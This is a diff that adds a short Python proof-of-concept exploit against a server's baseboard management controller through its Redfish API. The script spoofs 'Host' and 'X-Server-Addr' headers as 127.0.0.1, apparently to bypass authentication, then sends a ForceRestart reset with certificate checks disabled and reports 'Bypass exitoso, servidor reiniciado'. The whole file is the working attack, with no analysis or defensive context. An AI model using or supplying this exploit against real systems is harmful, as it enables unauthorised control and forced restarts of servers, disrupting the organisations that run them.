@@ -1,0 +1,15 @@
+import requests
+
+url = "https://<bmc_ip>/redfish/v1/Managers/1/Actions/Manager.Reset"
+headers = {
+    "Host": "127.0.0.1",
+    "X-Server-Addr": "127.0.0.1",
+    "Content-Type": "application/json"
+}
+payload = {"ResetType": "ForceRestart"}
+
+r = requests.post(url, headers=headers, json=payload, verify=False)
+if r.status_code == 200:
+    print("[+] Bypass exitoso, servidor reiniciado")
+else:
+    print("[-] Fallo:", r.status_code, r.text)
